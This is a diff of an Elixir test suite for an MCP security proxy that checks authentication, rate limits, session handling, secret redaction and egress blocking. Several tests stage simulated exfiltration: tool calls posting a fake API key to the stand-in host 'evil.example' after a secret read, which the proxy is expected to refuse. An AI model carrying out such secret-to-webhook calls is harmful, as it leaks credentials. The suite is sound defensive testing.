@@ -1,268 +1,336 @@
 defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
-  use PhoenixElxirBeamWeb.ConnCase, async: true
+  # async: false — the request runs in a separate process that needs the
+  # shared sandbox connection to read `api_keys`.
+  use PhoenixElxirBeamWeb.ConnCase, async: false
 
-  alias PhoenixElxirBeam.MCP.ServerRegistry
+  import PhoenixElxirBeam.MCPProxyHelpers
 
-  defp with_session(conn, session_id) do
-    put_req_header(conn, "mcp-session-id", session_id)
-  end
+  alias PhoenixElxirBeam.MCP.{ApiKey, ServerRegistry, SessionStore}
 
-  defp call_body(method, params) do
-    %{"jsonrpc" => "2.0", "id" => 1, "method" => method, "params" => params}
-  end
+  @catalog_fixture Path.expand("../../../support/fixtures/catalog_mcp_server.js", __DIR__)
 
-  test "a benign tool call is allowed and forwarded to the mock server", %{conn: conn} do
-    session_id = "proxy-test-benign-#{System.unique_integer([:positive])}"
+  # Every test drives the proxy against a real (stdio) MCP server, authenticated
+  # with an API key granted to that server. There is no mock transport.
+  setup do
+    node = System.find_executable("node") || raise "node not found on PATH"
 
-    conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
+    {:ok, server} =
+      ServerRegistry.register_stdio_server(
+        "catalog-#{System.unique_integer([:positive])}",
+        node,
+        [@catalog_fixture]
       )
 
-    assert %{"jsonrpc" => "2.0", "id" => 1, "result" => result} = json_response(conn, 200)
-    assert %{"isError" => false} = result
+    on_exit(fn -> ServerRegistry.remove_server(server.id) end)
+
+    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
+    {:ok, _} = ServerRegistry.set_tool_tags(server.id, "post_webhook", [:network_egress])
+
+    {_key, token} = issue_key(all_servers: false, granted_server_ids: [server.id])
+    %{sid: server.id, token: token}
   end
 
-  test "the mcp-agent-id header is captured and stamped on the broadcast event", %{conn: conn} do
-    session_id = "proxy-test-agent-#{System.unique_integer([:positive])}"
-    Phoenix.PubSub.subscribe(PhoenixElxirBeam.PubSub, "mcp:events")
+  # -- authentication -------------------------------------------------
 
-    conn
-    |> with_session(session_id)
-    |> put_req_header("mcp-agent-id", "agent://ci-runner")
-    |> post(
-      ~p"/mcp/proxy/files",
-      call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
+  test "a request with no bearer token is 401", %{conn: conn, sid: sid} do
+    conn = post(conn, ~p"/mcp/proxy/#{sid}", rpc("initialize", %{}))
+
+    assert %{"error" => %{"message" => "authentication required"}} = json_response(conn, 401)
+    assert ["Bearer"] = get_resp_header(conn, "www-authenticate")
+  end
+
+  test "a request with a bogus token is 401", %{sid: sid} do
+    conn =
+      authed("mcpk_nope.deadbeef") |> proxy_post(sid, rpc("initialize", %{}))
+
+    assert json_response(conn, 401)
+  end
+
+  test "a revoked key is 401", %{sid: sid} do
+    {key, token} = issue_key(granted_server_ids: [sid])
+    :ok = ApiKey.revoke(key.key_id)
+
+    conn = authed(token) |> proxy_post(sid, rpc("initialize", %{}))
+    assert json_response(conn, 401)
+  end
+
+  # -- transport hardening (M1.5) -----------------------------------
+
+  test "an oversized request body is rejected with 413", %{sid: sid, token: token} do
+    big = String.duplicate("x", 1_200_000)
+
+    conn =
+      authed(token)
+      |> put_req_header("content-length", "1200000")
+      |> proxy_post(sid, rpc("initialize", %{"junk" => big}))
+
+    assert %{"error" => %{"message" => message}} = json_response(conn, 413)
+    assert message =~ "exceeds"
+  end
+
+  test "a principal over its rate limit gets 429 + Retry-After", %{sid: sid, token: token} do
+    prev = Application.get_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter)
+
+    Application.put_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter,
+      window_ms: 60_000,
+      max_per_window: 2
     )
 
-    assert_receive {:mcp_event,
-                    %{
-                      session_id: ^session_id,
-                      tool_name: "list_files",
-                      agent_id: "agent://ci-runner"
-                    }},
-                   2_000
+    on_exit(fn ->
+      Application.put_env(:phoenix_elxir_beam, PhoenixElxirBeam.MCP.RateLimiter, prev)
+    end)
+
+    for _ <- 1..2 do
+      authed(token) |> proxy_post(sid, rpc("ping", %{}))
+    end
+
+    conn = authed(token) |> proxy_post(sid, rpc("ping", %{}))
+    assert %{"error" => %{"message" => "rate limit exceeded"}} = json_response(conn, 429)
+    assert [retry] = get_resp_header(conn, "retry-after")
+    assert String.to_integer(retry) >= 1
   end
 
-  test "the post_call scan redacts a credential in a tool response", %{conn: conn} do
-    session_id = "proxy-test-redact-#{System.unique_integer([:positive])}"
+  # -- authorization -------------------------------------------------
+
+  test "initialize is refused for a server the key isn't granted", %{sid: sid} do
+    {_key, token} = issue_key(all_servers: false, granted_server_ids: ["real-other"])
 
     conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
-      )
+      authed(token)
+      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))
+
+    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
+    assert message =~ "not authorized for server"
+  end
+
+  test "a session cannot be reused by a different key", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    {_other, other_token} = issue_key(granted_server_ids: [sid])
+
+    conn = tool_call(other_token, session_id, sid, "list_files")
+    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
+    assert message =~ "different key"
+  end
+
+  # -- handshake / session gating -----------------------------------
+
+  test "initialize mints a session id and returns proxy serverInfo", %{sid: sid, token: token} do
+    conn =
+      authed(token)
+      |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))
+
+    assert %{"result" => %{"serverInfo" => %{"name" => "mcp-security-proxy"}}} =
+             json_response(conn, 200)
+
+    assert [session_id] = get_resp_header(conn, "mcp-session-id")
+    assert String.starts_with?(session_id, "mcps-")
+  end
+
+  test "initialize against an unregistered server is a JSON-RPC error", %{} do
+    {_key, token} = issue_key(all_servers: true)
+
+    conn = authed(token) |> proxy_post("real-nope", rpc("initialize", %{}))
+    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
+    assert message =~ "no MCP server registered"
+  end
+
+  test "a tools/call with no prior handshake is refused", %{sid: sid, token: token} do
+    conn = tool_call(token, "mcps-not-real", sid, "list_files")
+
+    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
+    assert message =~ "no active MCP session"
+  end
+
+  test "a tools/call before notifications/initialized is refused", %{sid: sid, token: token} do
+    init =
+      authed(token) |> proxy_post(sid, rpc("initialize", %{"protocolVersion" => "2025-06-18"}))
+
+    [session_id] = get_resp_header(init, "mcp-session-id")
+    on_exit(fn -> SessionStore.close(session_id) end)
+
+    conn = tool_call(token, session_id, sid, "list_files")
+    assert %{"error" => %{"message" => message}} = json_response(conn, 200)
+    assert message =~ "handshake incomplete"
+  end
+
+  test "DELETE tears the session down", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    assert {:ok, _} = SessionStore.fetch(session_id)
+
+    authed(token) |> put_req_header("mcp-session-id", session_id) |> proxy_delete(sid)
+
+    assert :error = SessionStore.fetch(session_id)
+  end
+
+  # -- policy pipeline ---------------------------------------------
+
+  test "a benign tool call is allowed and forwarded", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = tool_call(token, session_id, sid, "list_files")
+
+    assert %{"jsonrpc" => "2.0", "id" => 1, "result" => %{"isError" => false}} =
+             json_response(conn, 200)
+  end
+
+  test "the agent id from the key is stamped on the broadcast event", %{sid: sid} do
+    Phoenix.PubSub.subscribe(PhoenixElxirBeam.PubSub, "mcp:events")
+    {_key, token} = issue_key(agent_id: "agent://ci-runner", granted_server_ids: [sid])
+    session_id = handshake(token, sid)
+
+    tool_call(token, session_id, sid, "list_files")
+
+    assert_receive {:mcp_event, %{tool_name: "list_files", agent_id: "agent://ci-runner"}}, 2_000
+  end
+
+  test "the post_call scan redacts a credential in a tool response", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = tool_call(token, session_id, sid, "read_secrets")
 
     assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
     refute text =~ "sk-demo-FAKE1234"
     assert text =~ "redacted by secret-leak"
-    assert text =~ "(simulated content, not a real secret)"
   end
 
-  test "an oversized tool response is withheld with -32002", %{conn: conn} do
-    session_id = "proxy-test-bulk-#{System.unique_integer([:positive])}"
-
-    conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "export_all", "arguments" => %{}})
-      )
+  test "an oversized tool response is withheld with -32002", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = tool_call(token, session_id, sid, "export_all")
 
     assert %{"error" => %{"code" => -32002, "message" => message}} = json_response(conn, 200)
     assert message =~ "bulk exfiltration"
-    refute match?(%{"result" => _}, json_response(conn, 200))
-  end
-
-  test "a streamed response is cut mid-stream once it passes the byte budget", %{conn: conn} do
-    session_id = "proxy-test-stream-#{System.unique_integer([:positive])}"
-
-    conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "stream_export", "arguments" => %{}})
-      )
-
-    assert %{"result" => result} = json_response(conn, 200)
-    assert result["streamTerminated"] == true
-
-    content = result["content"]
-    # fewer than the 24 chunks the mock would have sent, plus a termination notice
-    assert length(content) < 24
-    assert List.last(content)["text"] =~ "stream terminated by policy"
-    refute Map.has_key?(result, "chunks")
-  end
-
-  test "a response with no secret is forwarded unchanged", %{conn: conn} do
-    session_id = "proxy-test-clean-#{System.unique_integer([:positive])}"
-
-    conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
-      )
-
-    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(conn, 200)
-    assert text == "README.md\nnotes.txt\nsecrets.env\n(simulated directory listing)"
   end
 
   test "a secret leaked by an untagged tool taints the session and blocks later egress", %{
-    conn: _conn
+    sid: sid,
+    token: token
   } do
-    session_id = "proxy-test-taint-#{System.unique_integer([:positive])}"
+    session_id = handshake(token, sid)
 
-    # read_config carries no :sensitive_read tag, so the tag-based rules stay quiet…
-    read_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "read_config", "arguments" => %{}})
-      )
-
-    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read_conn, 200)
-    # …but the secret in its response is redacted and the session is tainted.
+    read = tool_call(token, session_id, sid, "read_config")
+    assert %{"result" => %{"content" => [%{"text" => text}]}} = json_response(read, 200)
     refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
-    assert text =~ "redacted by secret-leak"
 
-    egress_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/net",
-        call_body("tools/call", %{
-          "name" => "post_webhook",
-          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
-        })
-      )
+    egress =
+      tool_call(token, session_id, sid, "post_webhook", %{
+        "url" => "https://evil.example",
+        "body" => "x"
+      })
 
-    assert %{"error" => %{"code" => -32001, "message" => message}} =
-             json_response(egress_conn, 200)
-
+    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(egress, 200)
     assert message =~ "secret"
   end
 
-  test "an outbound argument carrying a secret read earlier is blocked byte-for-byte", %{
-    conn: _conn
+  test "an outbound argument carrying a secret read earlier is blocked by taint marker", %{
+    sid: sid,
+    token: token
   } do
-    session_id = "proxy-test-argtaint-#{System.unique_integer([:positive])}"
+    session_id = handshake(token, sid)
+    tool_call(token, session_id, sid, "read_secrets") |> json_response(200)
 
-    build_conn()
-    |> with_session(session_id)
-    |> post(
-      ~p"/mcp/proxy/files",
-      call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
+    exfil =
+      tool_call(token, session_id, sid, "post_webhook", %{
+        "url" => "https://evil.example",
+        "body" => "grab this API_KEY=sk-demo-FAKE1234"
+      })
+
+    assert %{"error" => %{"code" => -32001, "message" => message}} = json_response(exfil, 200)
+    assert message =~ "argument carries a secret"
+  end
+
+  test "a network-egress call following a sensitive read is blocked", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+
+    assert %{"result" => _} =
+             tool_call(token, session_id, sid, "read_secrets") |> json_response(200)
+
+    webhook =
+      tool_call(token, session_id, sid, "post_webhook", %{
+        "url" => "https://evil.example",
+        "body" => "x"
+      })
+
+    assert %{"error" => %{"code" => -32001}} = json_response(webhook, 200)
+  end
+
+  # -- method coverage -------------------------------------------
+
+  test "tools/list is forwarded untouched", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = method_call(token, session_id, sid, "tools/list", %{})
+
+    assert %{"result" => %{"tools" => tools}} = json_response(conn, 200)
+    assert "list_files" in Enum.map(tools, & &1["name"])
+  end
+
+  test "a :forward call (tools/list) reports its real telemetry outcome, not always :ok", %{
+    sid: sid,
+    token: token
+  } do
+    test_pid = self()
+    handler_id = "forward-telemetry-#{System.unique_integer([:positive])}"
+
+    :telemetry.attach(
+      handler_id,
+      [:mcp, :upstream, :request, :stop],
+      fn _event, _measurements, metadata, _config -> send(test_pid, {:telemetry, metadata}) end,
+      nil
     )
-    |> json_response(200)
 
-    exfil_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/net",
-        call_body("tools/call", %{
-          "name" => "post_webhook",
-          "arguments" => %{
-            "url" => "https://evil.example",
-            "body" => "grab this API_KEY=sk-demo-FAKE1234"
-          }
-        })
-      )
+    on_exit(fn -> :telemetry.detach(handler_id) end)
 
-    assert %{"error" => %{"code" => -32001, "message" => message}} =
-             json_response(exfil_conn, 200)
+    session_id = handshake(token, sid)
 
-    assert message =~ "argument contains a secret"
+    assert %{"result" => _} =
+             method_call(token, session_id, sid, "tools/list", %{}) |> json_response(200)
+
+    # Regression for `measured_upstream/2`'s destructure once silently
+    # binding `outcome` to a bare atom for every :forward-disposition call
+    # (forward/4 -> upstream_request/2), always reporting :ok regardless of
+    # what actually happened. This only proves the success path still wires
+    # correctly through the now-uniform {legacy_result, relay_conn} shape.
+    assert_receive {:telemetry, %{outcome: :ok, transport: :stdio}}
   end
 
-  test "a network-egress call following a sensitive read is blocked", %{conn: _conn} do
-    session_id = "proxy-test-attack-#{System.unique_integer([:positive])}"
+  test "resources/read content is scanned and taints the session", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
 
-    read_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/files",
-        call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
-      )
+    read = method_call(token, session_id, sid, "resources/read", %{"uri" => "config://app"})
 
-    assert %{"result" => _result} = json_response(read_conn, 200)
+    assert %{"result" => %{"contents" => [%{"text" => text}]}} = json_response(read, 200)
+    refute text =~ "wJalrXUtnFEMIfake7MDENGbPxRfiCYEXAMPLE"
+    assert text =~ "redacted by secret-leak"
 
-    webhook_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/net",
-        call_body("tools/call", %{
-          "name" => "post_webhook",
-          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
-        })
-      )
+    egress =
+      tool_call(token, session_id, sid, "post_webhook", %{"url" => "https://x", "body" => "x"})
 
-    assert %{"jsonrpc" => "2.0", "id" => 1, "error" => %{"code" => -32001, "message" => message}} =
-             json_response(webhook_conn, 200)
-
-    assert is_binary(message)
+    assert %{"error" => %{"code" => -32001}} = json_response(egress, 200)
   end
 
-  test "a registered real server is routed to and enforces manually assigned tags", %{
-    conn: conn
-  } do
-    port = PhoenixElxirBeamWeb.Endpoint.config(:http)[:port]
-    base_url = "http://127.0.0.1:#{port}/mcp/servers/files"
+  test "prompts/get message content is scanned and redacted", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = method_call(token, session_id, sid, "prompts/get", %{"name" => "greeting"})
 
-    {:ok, server} = ServerRegistry.register_server("External files", base_url)
-    on_exit(fn -> ServerRegistry.remove_server(server.id) end)
+    assert %{"result" => %{"messages" => [%{"content" => %{"text" => text}}]}} =
+             json_response(conn, 200)
 
-    {:ok, _updated} = ServerRegistry.set_tool_tags(server.id, "read_secrets", [:sensitive_read])
-
-    session_id = "proxy-test-real-#{System.unique_integer([:positive])}"
-
-    allowed_conn =
-      conn
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/#{server.id}",
-        call_body("tools/call", %{"name" => "list_files", "arguments" => %{}})
-      )
-
-    assert %{"result" => %{"isError" => false}} = json_response(allowed_conn, 200)
-
-    read_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/#{server.id}",
-        call_body("tools/call", %{"name" => "read_secrets", "arguments" => %{}})
-      )
-
-    assert %{"result" => _result} = json_response(read_conn, 200)
-
-    egress_conn =
-      build_conn()
-      |> with_session(session_id)
-      |> post(
-        ~p"/mcp/proxy/net",
-        call_body("tools/call", %{
-          "name" => "post_webhook",
-          "arguments" => %{"url" => "https://evil.example", "body" => "x"}
-        })
-      )
-
-    assert %{"error" => %{"code" => -32001}} = json_response(egress_conn, 200)
+    refute text =~ "sk-demo-FAKE1234"
+    assert text =~ "redacted by secret-leak"
   end
 
-  test "a call to a tool a discovery scan has quarantined is refused with -32003", %{conn: conn} do
+  test "a server→client method is refused", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = method_call(token, session_id, sid, "sampling/createMessage", %{})
+
+    assert %{"error" => %{"code" => -32601}} = json_response(conn, 200)
+  end
+
+  test "an unknown method is refused", %{sid: sid, token: token} do
+    session_id = handshake(token, sid)
+    conn = method_call(token, session_id, sid, "totally/madeup", %{})
+
+    assert %{"error" => %{"code" => -32601}} = json_response(conn, 200)
+  end
+
+  test "a quarantined tool is refused with -32003", %{} do
     node = System.find_executable("node") || raise "node not found on PATH"
     fixture = Path.expand("../../../support/fixtures/drifting_mcp_server.js", __DIR__)
     sentinel = Path.join(System.tmp_dir!(), "drift-#{System.unique_integer([:positive])}")
@@ -275,17 +343,11 @@ defmodule PhoenixElxirBeamWeb.MCP.ProxyControllerTest do
     {:ok, re} = ServerRegistry.rehandshake(server.id)
     assert Enum.find(re.tools, &(&1.name == "note")).quarantined
 
-    quarantined_conn =
-      conn
-      |> with_session("proxy-test-quarantine-#{System.unique_integer([:positive])}")
-      |> post(
-        ~p"/mcp/proxy/#{server.id}",
-        call_body("tools/call", %{"name" => "note", "arguments" => %{}})
-      )
+    {_key, token} = issue_key(granted_server_ids: [server.id])
+    session_id = handshake(token, server.id)
+    conn = tool_call(token, session_id, server.id, "note")
 
-    assert %{"error" => %{"code" => -32003, "message" => message}} =
-             json_response(quarantined_conn, 200)
-
+    assert %{"error" => %{"code" => -32003, "message" => message}} = json_response(conn, 200)
     assert message =~ "changed since registration"
   end
 end
